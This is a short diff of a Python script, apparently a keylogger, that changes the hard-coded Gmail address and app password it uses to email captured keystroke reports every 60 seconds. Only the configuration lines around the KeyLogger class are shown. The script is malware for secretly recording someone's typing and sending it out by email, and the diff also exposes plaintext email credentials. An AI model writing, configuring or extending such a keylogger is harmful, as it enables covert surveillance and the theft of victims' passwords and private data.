@@ -4,8 +4,8 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # CONFIGURATION
-EMAIL_ADDRESS = "techb1335@gmail.com"
-EMAIL_PASSWORD = "oobl xdxj nsgq elhp "
+EMAIL_ADDRESS = "lolalor20@gmail.com"
+EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
 SEND_REPORT_EVERY = 60  # Envoi du rapport chaque 60 secondes
 
 class KeyLogger:
